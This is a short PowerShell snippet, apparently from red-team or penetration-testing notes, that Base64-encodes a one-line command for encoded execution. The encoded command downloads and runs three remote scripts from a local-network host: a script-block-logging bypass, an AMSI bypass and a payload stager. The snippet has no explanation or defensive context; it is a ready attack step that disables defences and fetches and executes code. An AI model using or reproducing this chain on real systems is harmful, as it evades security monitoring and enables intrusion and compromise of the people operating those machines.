```powershell
$Text = 'iex (iwr http://192.168.2.228:8080/sbloggingbypass.txt -useb);iex (iwr http://192.168.2.228:8080/amsibypass.txt -useb);iex (iwr http://192.168.2.228:8080/stager.ps1 -useb);'; $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text); $EncodedText =[Convert]::ToBase64String($Bytes); $EncodedText
```

